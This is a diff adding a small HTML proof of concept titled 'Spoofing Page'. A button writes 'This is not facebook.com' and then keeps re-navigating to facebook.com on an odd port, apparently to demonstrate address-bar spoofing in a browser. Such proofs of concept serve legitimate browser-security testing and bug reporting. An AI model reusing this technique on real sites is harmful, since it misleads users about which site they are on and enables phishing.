@@ -1,0 +1,19 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8">
+        <title>Spoofing Page</title>
+        <script>
+            function spoof() {
+                document.write("<h1>This is not facebook.com</h1>");
+                document.location = "https://facebook.com:1234";
+                setInterval(function () {
+                    document.location = "https://facebook.com:1234";
+                }, 9800);
+            }
+        </script>
+    </head>
+    <body>
+        <input type="button" value="Run" onclick="spoof();"/>
+    </body>
+</html>
